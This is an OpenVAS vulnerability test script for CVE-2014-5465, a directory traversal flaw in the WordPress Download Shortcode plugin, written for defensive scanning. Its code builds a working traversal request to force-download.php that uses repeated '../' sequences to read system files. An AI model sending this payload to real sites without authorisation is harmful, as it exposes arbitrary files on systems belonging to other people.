###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_download_shortcode_dir_trav_vuln.nasl 11867 2018-10-12 10:48:11Z cfischer $
#
# WordPress ShortCode Plugin Directory Traversal Vulnerability
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804837");
  script_version("$Revision: 11867 $");
  script_cve_id("CVE-2014-5465");
  script_bugtraq_id(69440);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:48:11 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2014-09-08 13:34:59 +0530 (Mon, 08 Sep 2014)");

  script_name("WordPress ShortCode Plugin Directory Traversal Vulnerability");

  script_tag(name:"summary", value:"This host is installed with WordPress
  ShortCode Plugin and is prone to directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET
  request and check whether it is possible to read a local file");

  script_tag(name:"insight", value:"Input passed via the 'file' parameter
  to force-download.php script is not properly sanitized before being returned
  to the user");

  script_tag(name:"impact", value:"Successful exploitation will allow
  attacker to read arbitrary files on the target system.");

  script_tag(name:"affected", value:"WordPress Download Shortcode plugin
  version 0.2.3 and earlier.");

  script_tag(name:"solution", value:"Upgrade to version 1.1 or later.");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/34436/");
  script_xref(name:"URL", value:"http://www.packetstormsecurity.com/files/128024");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_dependencies("secpod_wordpress_detect_900182.nasl", "os_detection.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  script_xref(name:"URL", value:"http://wordpress.org/plugins/download-shortcode");
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

files = traversal_files();

foreach file (keys(files))
{
  url = dir + "/wp-content/force-download.php?file=" +
              crap(data:"../",length:3*15) + files[file];

  if(http_vuln_check(port:http_port, url:url, pattern:file))
  {
    security_message(port:http_port);
    exit(0);
  }
}
